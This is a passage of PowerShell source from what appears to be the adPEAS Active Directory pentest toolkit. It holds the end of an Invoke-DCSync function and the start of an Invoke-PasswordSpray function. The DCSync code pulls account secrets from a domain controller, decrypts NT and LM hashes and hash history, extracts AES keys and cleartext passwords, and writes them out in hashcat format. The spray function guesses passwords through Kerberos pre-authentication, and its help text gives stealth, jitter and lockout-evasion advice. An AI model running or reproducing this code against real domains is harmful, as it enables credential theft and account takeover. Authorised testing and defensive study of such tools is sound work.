                    Error      = "No domain specified and no active adPEAS session found."
                }
            }
        }

        # Auto-detect Server if not specified
        if (-not $Server) {
            # Try to get from session first
            if ($Script:LDAPContext -and $Script:LDAPContext['Server']) {
                $Server = $Script:LDAPContext['Server']
                Write-Log "[Invoke-DCSync] Using session DC: $Server"
            }
            else {
                # No session - use Resolve-adPEASName for DC discovery
                Write-Log "[Invoke-DCSync] No session found, discovering DC for domain: $Domain"
                $dcResult = Resolve-adPEASName -Domain $Domain

                if ($dcResult -and $dcResult.Hostname) {
                    $Server = $dcResult.Hostname
                    Write-Log "[Invoke-DCSync] Auto-discovered DC: $Server (IP: $($dcResult.IP))"
                }
                else {
                    Show-Line "DCSync failed: Could not locate reachable Domain Controller for domain '$Domain'" -Class Finding
                    Show-Line "Verify domain name and network connectivity (Port 88 + 389/636)" -Class Note
                    return [PSCustomObject]@{
                        PSTypeName = 'adPEAS.DCSync.Result'
                        Success    = $false
                        Error      = "Could not locate reachable Domain Controller for domain '$Domain'"
                        Domain     = $Domain
                    }
                }
            }
        }

        # ===== Authentication Validation =====
        # DCSync uses RPC (DRSUAPI) which requires Kerberos or NTLM credentials.
        # We need to validate that appropriate credentials are available BEFORE attempting RPC binding.

        $AuthUser = $null
        $AuthDomain = $null
        $AuthPassword = $null

        if ($Credential) {
            # Explicit credentials provided - extract for RPC
            $netCred = $Credential.GetNetworkCredential()
            $AuthUser = $netCred.UserName
            $AuthDomain = if ($netCred.Domain) { $netCred.Domain } else { $Domain }
            $AuthPassword = $netCred.Password
            Write-Log "[Invoke-DCSync] Using explicit credentials for: $AuthDomain\$AuthUser"
        }
        else {
            # No explicit credentials - check if we can use session or current context
            if ($Script:LDAPContext -and $Script:LDAPContext['AuthMethod']) {
                $SessionAuthMethod = $Script:LDAPContext['AuthMethod']

                # RPC (DRSUAPI) works with these auth methods:
                # - Kerberos (TGT in LSA cache from PTT)
                # - WindowsSSPI (Windows SSPI provides Kerberos/NTLM)
                # - WindowsAuth (same as WindowsSSPI)
                # - NTLM Impersonation (runas /netonly sets network credentials)
                #
                # RPC does NOT work with:
                # - SimpleBind (LDAP-only credentials, no Windows session)
                # - Schannel (TLS client cert, no Kerberos/NTLM)

                $validAuthMethods = @('Kerberos', 'WindowsSSPI', 'WindowsAuth', 'NTLM Impersonation')

                if ($SessionAuthMethod -in $validAuthMethods) {
                    # Session has compatible auth - RPC will use it via NULL identity (IntPtr.Zero)
                    Write-Log "[Invoke-DCSync] Using session authentication: $SessionAuthMethod"
                }
                else {
                    # Session has incompatible auth (SimpleBind/Schannel) - warn and try current user context
                    Show-Line "Warning: Current session uses $SessionAuthMethod (incompatible with RPC)" -Class Hint
                    Show-Line "DCSync will attempt to use current Windows user context instead" -Class Note
                    Show-Line "If this fails, provide explicit credentials via -Credential parameter" -Class Note
                    Write-Log "[Invoke-DCSync] Session auth '$SessionAuthMethod' incompatible with RPC, falling back to current user context"
                }
            }
            else {
                # No session - use current Windows user context
                Show-Line "No adPEAS session found - using current Windows user context for DCSync" -Class Note
                Show-Line "Authentication: Current logged-on user ($env:USERDOMAIN\$env:USERNAME)" -Class Note
                Show-Line "If access is denied, provide credentials via -Credential parameter" -Class Hint
                Write-Log "[Invoke-DCSync] No session found, using current Windows user context"
            }
        }

        # Parse Identity to determine if it's a GUID, SID, DN, or sAMAccountName
        $targetUser = $null
        $targetGuid = $null

        if ($Identity -match '^[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}$') {
            # GUID format
            $targetGuid = $Identity
            Write-Log "[Invoke-DCSync] Target GUID: $targetGuid"
        }
        elseif ($Identity -match '^S-1-[0-59]-\d+') {
            # SID format - convert to sAMAccountName via ConvertFrom-SID
            $resolvedName = ConvertFrom-SID -SID $Identity
            if ($resolvedName -and $resolvedName -ne $Identity) {
                # Extract just the account name (remove domain\ prefix if present)
                $targetUser = if ($resolvedName -match '\\(.+)$') { $Matches[1] } else { $resolvedName }
                Write-Log "[Invoke-DCSync] Resolved SID $Identity to: $targetUser"
            }
            else {
                Show-Line "DCSync failed: Could not resolve SID '$Identity' to an account name" -Class Finding
                return [PSCustomObject]@{
                    PSTypeName       = 'adPEAS.DCSync.Result'
                    Success          = $false
                    Error            = "Could not resolve SID '$Identity' to an account name"
                    Domain           = $Domain
                    DomainController = $Server
                }
            }
        }
        else {
            # sAMAccountName or DN - let C# handle it
            $targetUser = $Identity
            Write-Log "[Invoke-DCSync] Target user: $targetUser"
        }

        Write-Log "[Invoke-DCSync] Domain: $Domain"
        Write-Log "[Invoke-DCSync] DC: $Server"
        Write-Log "[Invoke-DCSync] Auth: $(if ($AuthUser) { "$AuthDomain\$AuthUser" } else { 'Current session (Negotiate)' })"

        # Initialize output file collection (function-local scope)
        $OutputFileContent = @()

        # Determine if we need to query accounts via LDAP first
        $accountsToSync = @()

        if ($AllAccounts -or $UsersOnly -or $ComputersOnly -or $EnabledOnly) {
            # Build connection parameters hashtable for reuse across all Get-Domain* calls
            $connectionParams = @{
                Domain = $Domain
                Server = $Server
            }
            if ($Credential) {
                $connectionParams['Credential'] = $Credential
            }

            if (-not (Ensure-LDAPConnection @connectionParams)) {
                Show-Line "DCSync failed: Could not establish LDAP connection for account enumeration" -Class Finding
                return [PSCustomObject]@{
                    PSTypeName = 'adPEAS.DCSync.Result'
                    Success    = $false
                    Error      = "Could not establish LDAP connection for account enumeration"
                    Domain     = $Domain
                }
            }

            # Query accounts using Get-DomainUser or Get-DomainComputer
            try {
                $accounts = @()

                if ($UsersOnly) {
                    Write-Log "[Invoke-DCSync] Querying users$(if ($EnabledOnly) { ' (enabled only)' })"
                    $userParams = @{ Enabled = $EnabledOnly }
                    $userParams += $connectionParams
                    $accounts = Get-DomainUser @userParams
                }
                elseif ($ComputersOnly) {
                    Write-Log "[Invoke-DCSync] Querying computers$(if ($EnabledOnly) { ' (enabled only)' })"
                    $computerParams = @{ Enabled = $EnabledOnly }
                    $computerParams += $connectionParams
                    $accounts = Get-DomainComputer @computerParams
                }
                else {
                    # AllAccounts - query both users and computers
                    Write-Log "[Invoke-DCSync] Querying all accounts (users + computers)$(if ($EnabledOnly) { ' (enabled only)' })"
                    $userParams = @{ Enabled = $EnabledOnly }
                    $userParams += $connectionParams
                    $users = Get-DomainUser @userParams

                    $computerParams = @{ Enabled = $EnabledOnly }
                    $computerParams += $connectionParams
                    $computers = Get-DomainComputer @computerParams

                    $accounts = @($users) + @($computers)
                }

                if ($accounts) {
                    $accountsToSync = $accounts | ForEach-Object {
                        if ($_.sAMAccountName) {
                            $_.sAMAccountName
                        }
                    } | Where-Object { $_ }

                    Write-Log "[Invoke-DCSync] Found $($accountsToSync.Count) accounts to replicate"
                }
                else {
                    Show-Line "No accounts found matching the specified criteria" -Class Hint
                    return
                }
            }
            catch {
                Show-Line "DCSync failed: Could not query accounts - $($_.Exception.Message)" -Class Finding
                return [PSCustomObject]@{
                    PSTypeName       = 'adPEAS.DCSync.Result'
                    Success          = $false
                    Error            = "Could not query accounts: $($_.Exception.Message)"
                    Domain           = $Domain
                    DomainController = $Server
                }
            }
        }
        else {
            # Single account mode
            $accountsToSync = @($targetUser)
        }

        # Replicate each account
        $allResults = @()
        $currentAccount = 0

        foreach ($accountName in $accountsToSync) {
            $currentAccount++

            if ($accountsToSync.Count -gt 1) {
                Write-Log "[Invoke-DCSync] Replicating account $currentAccount/$($accountsToSync.Count): $accountName"
            }

            # Call C# interop
            Write-Log "[Invoke-DCSync] Initiating DRSUAPI replication for: $accountName"
            $rpcResult = [adPEAS.DCSyncInterop]::GetReplicationData(
                $Server,
                $Domain,
                $accountName,
                $null,  # GUID only used in single-account mode
                $AuthUser,
                $AuthDomain,
                $AuthPassword,
                $false,  # forceNtlm - always use Negotiate
                $false,  # allUsers - we handle iteration in PowerShell
                "ldap"   # altService - always use ldap
            )

            if (-not $rpcResult.Success) {
                Write-Log "[Invoke-DCSync] Replication failed for $accountName : $($rpcResult.Error)"
                # Log error but continue with next account in multi-account mode
                Show-Line "DCSync failed for $accountName : $($rpcResult.Error)" -Class Finding

                if ($accountsToSync.Count -eq 1) {
                    # Single account mode - return error object
                    return [PSCustomObject]@{
                        PSTypeName       = 'adPEAS.DCSync.Result'
                        Success          = $false
                        Error            = $rpcResult.Error
                        Domain           = $Domain
                        DomainController = $Server
                        SAMAccountName   = $accountName
                    }
                }
                else {
                    # Multi-account mode - continue with next account
                    continue
                }
            }

            # Process each replicated user from this RPC call
            foreach ($userData in $rpcResult.Users) {
            # Skip if no data
            if (-not $userData.SAMAccountName -and -not $userData.ObjectSID) {
                continue
            }


            # Extract RID and SID string from objectSID bytes
            $objectSIDString = $null
            $rid = $null
            if ($userData.ObjectSID) {
                try {
                    $sid = New-Object System.Security.Principal.SecurityIdentifier($userData.ObjectSID, 0)
                    $objectSIDString = $sid.Value
                    # Extract RID (last component)
                    $ridMatch = $objectSIDString -match '-(\d+)$'
                    if ($ridMatch) {
                        $rid = [uint32]$Matches[1]
                    }
                }
                catch {
                    Write-Log "[DCSync] Could not parse SID bytes"
                }
            }

            # Layer 2: RID-based DES decryption of hashes
            $ntHash = $null
            $lmHash = $null
            $ntHashHistory = @()
            $lmHashHistory = @()

            if ($userData.UnicodePassword -and $userData.ObjectSID) {
                $decryptedHash = [adPEAS.DCSyncInterop]::DecryptHashWithRID($userData.UnicodePassword, $userData.ObjectSID)
                if ($decryptedHash) {
                    $ntHash = [BitConverter]::ToString($decryptedHash).Replace('-','').ToLower()
                }
            }

            if ($userData.LMPassword -and $userData.ObjectSID) {
                $decryptedLM = [adPEAS.DCSyncInterop]::DecryptHashWithRID($userData.LMPassword, $userData.ObjectSID)
                if ($decryptedLM) {
                    $lmHash = [BitConverter]::ToString($decryptedLM).Replace('-','').ToLower()
                }
            }

            # NT hash history (each 16 bytes)
            if ($userData.NTPasswordHistory -and $userData.ObjectSID) {
                $histLen = $userData.NTPasswordHistory.Length
                for ($hIdx = 0; $hIdx -lt $histLen; $hIdx += 16) {
                    if (($hIdx + 16) -le $histLen) {
                        $histBlock = New-Object byte[] 16
                        [Array]::Copy($userData.NTPasswordHistory, $hIdx, $histBlock, 0, 16)
                        $decHist = [adPEAS.DCSyncInterop]::DecryptHashWithRID($histBlock, $userData.ObjectSID)
                        if ($decHist) {
                            $ntHashHistory += [BitConverter]::ToString($decHist).Replace('-','').ToLower()
                        }
                    }
                }
            }

            # LM hash history
            if ($userData.LMPasswordHistory -and $userData.ObjectSID) {
                $histLen = $userData.LMPasswordHistory.Length
                for ($hIdx = 0; $hIdx -lt $histLen; $hIdx += 16) {
                    if (($hIdx + 16) -le $histLen) {
                        $histBlock = New-Object byte[] 16
                        [Array]::Copy($userData.LMPasswordHistory, $hIdx, $histBlock, 0, 16)

                        # Check if encrypted block is all zeros (empty slot in history)
                        $isEmptySlot = ($histBlock | Where-Object { $_ -ne 0 }).Count -eq 0
                        if ($isEmptySlot) {
                            continue
                        }

                        $decHist = [adPEAS.DCSyncInterop]::DecryptHashWithRID($histBlock, $userData.ObjectSID)
                        if ($decHist) {
                            $lmHashHistory += [BitConverter]::ToString($decHist).Replace('-','').ToLower()
                        }
                    }
                }
            }

            # JustNTHash mode - output clean object with NT hash only
            if ($JustNTHash) {
                $ntHashOutput = [PSCustomObject]@{
                    SAMAccountName = $userData.SAMAccountName
                    NTHash         = $ntHash
                }

                # Add NT hash history if requested and present
                if ($IncludeHistory -and $ntHashHistory -and $ntHashHistory.Count -gt 0) {
                    $ntHashOutput | Add-Member -NotePropertyName "NTHashHistory" -NotePropertyValue $ntHashHistory
                }

                # Export to Hashcat format if requested
                if ($OutputFile -and $ntHash) {
                    $OutputFileContent += "$($userData.SAMAccountName):$ntHash"

                    # Add history hashes if present
                    if ($IncludeHistory -and $ntHashHistory -and $ntHashHistory.Count -gt 0) {
                        for ($i = 0; $i -lt $ntHashHistory.Count; $i++) {
                            $OutputFileContent += "$($userData.SAMAccountName)_history$($i+1):$($ntHashHistory[$i])"
                        }
                    }
                }

                Write-Output $ntHashOutput
                continue
            }

            # Layer 3: Parse supplementalCredentials
            $aes256Key = $null
            $aes128Key = $null
            $desKey = $null
            $kerberosSalt = $null
            $cleartextPassword = $null
            $wdigestHashes = @()

            if ($userData.SupplementalCredentials) {
                $suppCreds = ConvertFrom-SupplementalCredentials -Data $userData.SupplementalCredentials
                if ($suppCreds) {
                    $aes256Key = $suppCreds.AES256Key
                    $aes128Key = $suppCreds.AES128Key
                    $desKey = $suppCreds.DESKey
                    $kerberosSalt = $suppCreds.KerberosSalt
                    $cleartextPassword = $suppCreds.CleartextPassword
                    $wdigestHashes = $suppCreds.WDigestHashes
                }
            }

            # Convert timestamps
            $pwdLastSetDT = $null
            $accountExpiresDT = $null

            if ($userData.PwdLastSet -ne 0 -and $userData.PwdLastSet -ne [Int64]::MaxValue) {
                try {
                    $pwdLastSetDT = [DateTime]::FromFileTime($userData.PwdLastSet)
                }
                catch {
                    Write-Log "[DCSync] Failed to convert pwdLastSet timestamp: $($_.Exception.Message)"
                    $pwdLastSetDT = $null
                }
            }
            if ($userData.AccountExpires -ne 0 -and $userData.AccountExpires -ne [Int64]::MaxValue) {
                try {
                    $accountExpiresDT = [DateTime]::FromFileTime($userData.AccountExpires)
                }
                catch {
                    Write-Log "[DCSync] Failed to convert accountExpires timestamp: $($_.Exception.Message)"
                    $accountExpiresDT = $null
                }
            }
            elseif ($userData.AccountExpires -eq [Int64]::MaxValue -or $userData.AccountExpires -eq 0) {
                $accountExpiresDT = $null  # Never expires
            }

                # JustAES mode - only output AES keys
                if ($JustAES) {
                    if ($aes256Key -or $aes128Key) {
                        $aesOutput = [PSCustomObject]@{
                            SAMAccountName = $userData.SAMAccountName
                            AES256Key      = $aes256Key
                            AES128Key      = $aes128Key
                        }

                        # Export to Hashcat format if requested
                        if ($OutputFile) {
                            if ($aes256Key) {
                                $OutputFileContent += "$($userData.SAMAccountName):$aes256Key"
                            }
                            if ($aes128Key) {
                                $OutputFileContent += "$($userData.SAMAccountName):$aes128Key"
                            }
                        }

                        Write-Output $aesOutput
                    }
                    continue
                }

                # JustLM mode - only output LM hash
                if ($JustLM) {
                    $lmOutput = [PSCustomObject]@{
                        SAMAccountName = $userData.SAMAccountName
                        LMHash         = $lmHash
                    }

                    # Add LM hash history if requested and present
                    if ($IncludeHistory -and $lmHashHistory -and $lmHashHistory.Count -gt 0) {
                        $lmOutput | Add-Member -NotePropertyName "LMHashHistory" -NotePropertyValue $lmHashHistory
                    }

                    # Export to Hashcat format if requested
                    if ($OutputFile -and $lmHash) {
                        $OutputFileContent += "$($userData.SAMAccountName):$lmHash"

                        # Add history hashes if present
                        if ($IncludeHistory -and $lmHashHistory -and $lmHashHistory.Count -gt 0) {
                            for ($i = 0; $i -lt $lmHashHistory.Count; $i++) {
                                $OutputFileContent += "$($userData.SAMAccountName)_history$($i+1):$($lmHashHistory[$i])"
                            }
                        }
                    }

                    Write-Output $lmOutput
                    continue
                }

                # JustCleartext mode - only output cleartext password
                if ($JustCleartext) {
                    $cleartextOutput = [PSCustomObject]@{
                        SAMAccountName    = $userData.SAMAccountName
                        CleartextPassword = $cleartextPassword
                    }

                    # Export to file if requested (format: username:cleartext)
                    if ($OutputFile -and $cleartextPassword) {
                        $OutputFileContent += "$($userData.SAMAccountName):$cleartextPassword"
                    }

                    Write-Output $cleartextOutput
                    continue
                }

                # Build result object
                $resultObj = [PSCustomObject]@{
                    PSTypeName             = 'adPEAS.DCSync.Result'
                    Success                = $true
                    Domain                 = $Domain
                    DomainController       = $Server
                    SAMAccountName         = $userData.SAMAccountName
                    UserPrincipalName      = $userData.UserPrincipalName
                    DisplayName            = $userData.DisplayName
                    ObjectSID              = $objectSIDString
                    RID                    = $rid
                    UserAccountControl     = $userData.UserAccountControl
                    SAMAccountType         = $userData.SAMAccountType
                    PwdLastSet             = $pwdLastSetDT
                    AccountExpires         = $accountExpiresDT
                    NTHash                 = $ntHash
                    LMHash                 = $lmHash
                    AES256Key              = $aes256Key
                    AES128Key              = $aes128Key
                    DESKey                 = $desKey
                    KerberosSalt           = $kerberosSalt
                    CleartextPassword      = $cleartextPassword
                    WDigestHashes          = $wdigestHashes
                    SupplementalCredentials = $userData.SupplementalCredentials
                    Message                = "DCSync successful for $($userData.SAMAccountName)"
                    Error                  = $null
                }

                # Add history properties only if requested and present
                if ($IncludeHistory) {
                    if ($ntHashHistory -and $ntHashHistory.Count -gt 0) {
                        $resultObj | Add-Member -NotePropertyName "NTHashHistory" -NotePropertyValue $ntHashHistory
                    }
                    if ($lmHashHistory -and $lmHashHistory.Count -gt 0) {
                        $resultObj | Add-Member -NotePropertyName "LMHashHistory" -NotePropertyValue $lmHashHistory
                    }
                }

                # Export to file if requested (normal mode - all hashes)
                if ($OutputFile) {
                    # NT hash
                    if ($ntHash) {
                        $OutputFileContent += "$($userData.SAMAccountName):$ntHash"

                        # NT hash history if present
                        if ($IncludeHistory -and $ntHashHistory -and $ntHashHistory.Count -gt 0) {
                            for ($i = 0; $i -lt $ntHashHistory.Count; $i++) {
                                $OutputFileContent += "$($userData.SAMAccountName)_nt_history$($i+1):$($ntHashHistory[$i])"
                            }
                        }
                    }

                    # LM hash
                    if ($lmHash) {
                        $OutputFileContent += "$($userData.SAMAccountName)_lm:$lmHash"

                        # LM hash history if present
                        if ($IncludeHistory -and $lmHashHistory -and $lmHashHistory.Count -gt 0) {
                            for ($i = 0; $i -lt $lmHashHistory.Count; $i++) {
                                $OutputFileContent += "$($userData.SAMAccountName)_lm_history$($i+1):$($lmHashHistory[$i])"
                            }
                        }
                    }

                    # AES256 key
                    if ($aes256Key) {
                        $OutputFileContent += "$($userData.SAMAccountName)_aes256:$aes256Key"
                    }

                    # AES128 key
                    if ($aes128Key) {
                        $OutputFileContent += "$($userData.SAMAccountName)_aes128:$aes128Key"
                    }

                    # Cleartext password
                    if ($cleartextPassword) {
                        $OutputFileContent += "$($userData.SAMAccountName)_cleartext:$cleartextPassword"
                    }
                }

                # Collect result
                $allResults += $resultObj
                Write-Output $resultObj
            }  # End foreach ($userData in $rpcResult.Users)
        }  # End foreach ($accountName in $accountsToSync)

        # Write output file if requested
        if ($OutputFile -and $OutputFileContent.Count -gt 0) {
            try {
                $OutputFileContent | Out-File -FilePath $OutputFile -Force -Encoding ASCII
                Show-Line "Exported $($OutputFileContent.Count) entries to: $OutputFile" -Class Note
            }
            catch {
                Show-Line "Failed to write output file: $($_.Exception.Message)" -Class Finding
            }
        }
    }  # End process block
}  # End function



# ----- Invoke-PasswordSpray.ps1 -----

function Invoke-PasswordSpray {
<#
.SYNOPSIS
    Performs Kerberos-based password spray attack against Active Directory.

.DESCRIPTION
    Tests a single password (or multiple passwords) against a list of usernames using
    Kerberos Pre-Authentication (AS-REQ). This avoids LDAP binds and is stealthier.

    Uses sequential testing to avoid account lockouts. Each user is tested only once
    per password, spreading attempts over time to stay under lockout thresholds.

.PARAMETER UserList
    Path to file containing usernames (one per line) or array of usernames.
    Usernames can be in format: username, DOMAIN\username, or username@domain.com

.PARAMETER Auto
    Automatically fetch all enabled users from the current adPEAS session.
    Requires an active LDAP connection via Connect-adPEAS.

    Auto mode includes intelligent lockout protection:
    - Retrieves domain password policy (lockout threshold, observation window, duration)
    - Checks badPwdCount for each user
    - Skips users with badPwdCount >= (threshold - 1) to prevent lockouts
    - Displays skipped users with current bad password count
    - Only tests users with safe remaining attempts

.PARAMETER Password
    Single password to test against all users.

.PARAMETER PasswordList
    Path to file containing passwords (one per line) or array of passwords.
    WARNING: Testing multiple passwords increases lockout risk!

.PARAMETER Domain
    Target domain FQDN (optional, uses current domain from session if not specified)

.PARAMETER Server
    Domain Controller to query (optional, uses auto-discovery if not specified)

.PARAMETER Credential
    PSCredential object for authentication (optional, uses current user/session if not specified)

.PARAMETER Delay
    Delay in milliseconds between each attempt. Default: 0 (no delay).
    Use for stealth (e.g., -Delay 100) or when testing multiple passwords.

.PARAMETER StopOnSuccess
    Stop testing as soon as first valid credential is found.

.PARAMETER OutputFile
    Export successful credentials to file (format: username:password).

.PARAMETER Jitter
    Add random jitter to delay (percentage). Example: -Delay 100 -Jitter 20 means 80-120ms.

.OUTPUTS
    PSCustomObject array with successful credentials:
    - Username
    - Password
    - Domain
    - Timestamp

.EXAMPLE
    # Basic password spray with single password
    Invoke-PasswordSpray -UserList users.txt -Password "Winter2024!" -Domain "contoso.com"

.EXAMPLE
    # Using existing session (Domain parameter optional)
    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
    Invoke-PasswordSpray -UserList users.txt -Password "Winter2024!"

.EXAMPLE
    # Auto mode - fetch all enabled users with lockout protection
    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
    Invoke-PasswordSpray -Auto -Password "Winter2024!"

    Output:
    [*] Auto mode: Fetching domain password policy...
    [*] Lockout Policy:
        Threshold:          5 bad attempts
        Observation Window: 30 minutes
        Lockout Duration:   30 minutes

    [*] Fetching all enabled users from domain...
    [+] Found 523 enabled users
    [*] Checking badPwdCount for each user (lockout protection)...

    [!] WARNING: 3 users skipped due to lockout risk:
        - jdoe: 4/5 bad attempts (only 1 remaining)
        - asmith: 5/5 bad attempts (only 0 remaining)
        - bwilson: 4/5 bad attempts (only 1 remaining)

    [+] Safe to test: 520 users (skipped: 3)

.EXAMPLE
    # Password spray with delay for stealth
    Invoke-PasswordSpray -UserList users.txt -Password "Summer2024!" -Domain "contoso.com" -Delay 100

.EXAMPLE
    # Test multiple passwords (higher lockout risk!)
    Invoke-PasswordSpray -UserList users.txt -PasswordList passwords.txt -Domain "contoso.com" -Delay 1000

.EXAMPLE
    # Spray and export results
    $creds = Invoke-PasswordSpray -UserList users.txt -Password "P@ssw0rd" -Domain "contoso.com"
    $creds | Export-Csv -Path valid_creds.csv -NoTypeInformation

.EXAMPLE
    # User-as-pass spray (username = password)
    Get-Content users.txt | ForEach-Object {
        Invoke-PasswordSpray -UserList $_ -Password $_ -Domain "contoso.com"
    }

.NOTES
    Author: Alexander Sturz (@_61106960_)

    WARNING: Password spraying can cause account lockouts if not used carefully!
    - Use low attempt counts (1-2 passwords max)
    - Add delays between attempts when testing multiple passwords
    - Monitor for lockouts before continuing
    - Ensure you understand the target's lockout policy

    OPSEC Considerations:
    - Each attempt generates a Kerberos Pre-Auth event (4771)
    - Large bursts of failures from single IP are suspicious
    - Use -Delay parameter to spread attempts over time
#>
    [CmdletBinding(DefaultParameterSetName='UserList')]
    param(
        [Parameter(Mandatory=$true, Position=0, ParameterSetName='UserList')]
        [object]$UserList,

        [Parameter(Mandatory=$true, ParameterSetName='Auto')]
        [switch]$Auto,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [object]$PasswordList,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [int]$Delay = 0,

        [Parameter(Mandatory=$false)]
        [int]$Jitter = 0,

        [Parameter(Mandatory=$false)]
        [switch]$StopOnSuccess,

        [Parameter(Mandatory=$false)]
        [string]$OutputFile
    )

    begin {
        # Validate parameters
        if (-not $Password -and -not $PasswordList) {
            Write-Error "You must specify either -Password or -PasswordList"
            return
        }

        if ($Password -and $PasswordList) {
            Write-Error "Cannot specify both -Password and -PasswordList. Choose one."
            return
        }

        # Build connection parameters (for Ensure-LDAPConnection and Get-Domain* calls)
        $connectionParams = @{}
        if ($Domain) { $connectionParams['Domain'] = $Domain }
        if ($Server) { $connectionParams['Server'] = $Server }
        if ($Credential) { $connectionParams['Credential'] = $Credential }

        # Load usernames
        $usernames = @()

        if ($Auto) {
            # Auto mode - fetch all enabled users from current adPEAS session
            if (-not (Ensure-LDAPConnection @connectionParams)) {
                Write-Error "Auto mode requires an active LDAP connection. Use Connect-adPEAS first."
                return
            }

            Write-Host "[*] Auto mode: Fetching domain password policy..." -ForegroundColor Cyan

            # Get password policy to check lockout settings
            $passwordPolicy = Get-DomainPasswordPolicy @connectionParams

            if (-not $passwordPolicy) {
                Write-Warning "Could not retrieve password policy - proceeding without lockout checks"
                $lockoutThreshold = 0
            } else {
                $lockoutThreshold = $passwordPolicy.LockoutThreshold
                $lockoutObservationWindow = $passwordPolicy.LockoutObservationWindow
                $lockoutDuration = $passwordPolicy.LockoutDuration

                Write-Host "[*] Lockout Policy:" -ForegroundColor Cyan
                Write-Host "    Threshold:          $lockoutThreshold bad attempts" -ForegroundColor $(if ($lockoutThreshold -eq 0) { "Yellow" } else { "Green" })
                Write-Host "    Observation Window: $lockoutObservationWindow minutes"
                Write-Host "    Lockout Duration:   $lockoutDuration minutes"
                Write-Host ""
            }

            Write-Host "[*] Fetching all enabled users from domain..." -ForegroundColor Cyan

            # Get all enabled users with badPwdCount attribute
            $enabledUsers = Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" @connectionParams

            if (-not $enabledUsers) {
                Write-Error "No enabled users found in domain"
                return
            }

            Write-Host "[+] Found $($enabledUsers.Count) enabled users" -ForegroundColor Green

            # Filter users based on lockout threshold
            $skippedUsers = @()
            $safeUsers = @()

            if ($lockoutThreshold -gt 0) {
                Write-Host "[*] Checking badPwdCount for each user (lockout protection)..." -ForegroundColor Cyan

                foreach ($user in $enabledUsers) {
                    $badPwdCount = 0
                    if ($user.badPwdCount) {
                        $badPwdCount = [int]$user.badPwdCount
                    }

                    # Calculate safety margin: Skip if user is 1 attempt away from lockout
                    $remainingAttempts = $lockoutThreshold - $badPwdCount

                    if ($remainingAttempts -le 1) {
                        $skippedUsers += [PSCustomObject]@{
                            Username = $user.sAMAccountName
                            BadPwdCount = $badPwdCount
                            RemainingAttempts = $remainingAttempts
                        }
                    } else {
                        $safeUsers += $user.sAMAccountName
                    }
                }

                if ($skippedUsers.Count -gt 0) {
                    Write-Host ""
                    Write-Host "[!] WARNING: $($skippedUsers.Count) users skipped due to lockout risk:" -ForegroundColor Yellow
                    foreach ($skipped in $skippedUsers) {
                        Write-Host "    - $($skipped.Username): $($skipped.BadPwdCount)/$lockoutThreshold bad attempts (only $($skipped.RemainingAttempts) remaining)" -ForegroundColor Yellow
                    }
                    Write-Host ""
                }

                $usernames = $safeUsers

                if ($usernames.Count -eq 0) {
                    Write-Error "No safe users to test - all accounts are close to lockout threshold"
                    return
                }

                Write-Host "[+] Safe to test: $($usernames.Count) users (skipped: $($skippedUsers.Count))" -ForegroundColor Green
                Write-Host ""

            } else {
                # No lockout policy - use all enabled users
                Write-Host "[*] No lockout policy configured - testing all enabled users" -ForegroundColor Yellow
                Write-Host ""
                $usernames = $enabledUsers | ForEach-Object { $_.sAMAccountName }
            }

        } elseif ($UserList -is [string]) {
            if (Test-Path $UserList) {
                $usernames = Get-Content -Path $UserList | Where-Object { $_ -and $_.Trim() }
            } else {
                Write-Error "User list file not found: $UserList"
                return
            }
        } elseif ($UserList -is [array]) {
            $usernames = $UserList
        } else {
            # Single username
            $usernames = @($UserList)
        }

        # Load passwords
        $passwords = @()
        if ($Password) {
            $passwords = @($Password)
        } else {
            if ($PasswordList -is [string]) {
                if (Test-Path $PasswordList) {
                    $passwords = Get-Content -Path $PasswordList | Where-Object { $_ -and $_.Trim() }
                } else {
                    Write-Error "Password list file not found: $PasswordList"
                    return
                }
            } elseif ($PasswordList -is [array]) {
                $passwords = $PasswordList
            }
        }

        if ($usernames.Count -eq 0) {
            Write-Error "No usernames to test"
            return
        }

        if ($passwords.Count -eq 0) {
            Write-Error "No passwords to test"
            return
        }

        # Get Domain from session if not specified
        $targetDomain = $Domain
        if (-not $targetDomain -and $Script:LDAPContext) {
            $targetDomain = $Script:LDAPContext.DomainDNS
        }

        if (-not $targetDomain) {
            Write-Error "No domain specified and no active session. Use -Domain parameter or Connect-adPEAS first."
            return
        }

        # Warn about lockout risk
        if ($passwords.Count -gt 1 -and $Delay -lt 500) {
            Write-Warning "Testing multiple passwords with low/no delay increases lockout risk!"
            Write-Warning "Consider using -Delay 1000 or higher when testing multiple passwords."
        }

        Write-Host "[*] Password Spray Configuration:" -ForegroundColor Cyan
        Write-Host "    Domain:          $targetDomain"
        if ($Server) {
            Write-Host "    DC:              $Server"
        }
        Write-Host "    Users:           $($usernames.Count)"
        Write-Host "    Passwords:       $($passwords.Count)"
        Write-Host "    Total Attempts:  $($usernames.Count * $passwords.Count)"
        Write-Host "    Delay:           ${Delay}ms" -NoNewline
        if ($Jitter -gt 0) {
            Write-Host " (+/- ${Jitter}%)" -ForegroundColor Yellow
        } else {
            Write-Host ""
        }
        Write-Host ""

        $successfulCreds = @()
        $totalAttempts = 0
        $successCount = 0
        $startTime = Get-Date
    }

    process {
        # Test each password against all users
        foreach ($pass in $passwords) {
            if ($passwords.Count -gt 1) {
                Write-Host "[*] Testing password: $pass" -ForegroundColor Cyan
            }

            $attemptNum = 0
            foreach ($username in $usernames) {
                $attemptNum++
                $totalAttempts++

                # Parse username format (handle DOMAIN\user or user@domain)
                $cleanUsername = $username
                if ($username -match '\\') {
                    $cleanUsername = $username.Split('\')[1]
                } elseif ($username -match '@') {
                    $cleanUsername = $username.Split('@')[0]
                }

                # Progress indicator every 50 attempts
                if ($attemptNum % 50 -eq 0) {
                    $percent = [math]::Round(($attemptNum / $usernames.Count) * 100)
                    Write-Host "    Progress: $attemptNum/$($usernames.Count) ($percent%)" -ForegroundColor Gray
                }

                # Test credential via Kerberos Pre-Auth
                $kerberosParams = @{
                    UserName = $cleanUsername
                    Domain = $targetDomain
                    Password = $pass
                    ErrorAction = 'SilentlyContinue'
                }
                if ($Server) { $kerberosParams['DomainController'] = $Server }

                $result = Invoke-KerberosAuth @kerberosParams
